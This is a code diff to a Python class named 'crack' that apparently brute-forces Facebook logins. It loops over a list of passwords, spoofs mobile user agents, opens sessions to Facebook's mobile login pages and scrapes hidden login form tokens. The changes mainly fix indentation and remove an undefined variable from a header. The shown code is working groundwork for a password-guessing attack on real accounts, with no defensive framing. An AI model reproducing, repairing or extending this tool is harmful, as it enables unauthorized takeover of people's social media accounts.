@@ -288,12 +288,11 @@ class crack:
         except:exit()
     ### MAIN ###
     def main(self, total, email, password):
-	
-	    try:
-		for pws in password:
-			self.useragent = self.realme_useragent(total = 1)
-			with requests.Session() as r:
-			r.headers.update({
+        try:
+            for pws in password:
+                self.useragent = self.realme_useragent(total = 1)
+                with requests.Session() as r:
+                    r.headers.update({
 			    'host': 'mbasic.facebook.com',
 			    'cache-control': 'max-age=0',
 			    'upgrade-insecure-requests': '1',
@@ -305,11 +304,10 @@ class crack:
 			    'sec-fetch-mode': 'cors',
 			    'sec-fetch-user': 'empty',
 			    'sec-fetch-dest': 'document',
-			    'referer': 'https://mbasic.facebook.com/login/?email='+idf,
+			    'referer': 'https://mbasic.facebook.com/login/?email=',
 			    'accept-encoding':'gzip, deflate br',
 			    'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})
-                    			
-		response = r.get('https://m.alpha.facebook.com/login.php?').text
+                    response = r.get('https://m.alpha.facebook.com/login.php?').text
                     try:
                         self.jazoest = re.search('name="jazoest" value="(\d+)"', str(response)).group(1)
                         self.m_ts = re.search('name="m_ts" value="(.*?)"', str(response)).group(1)
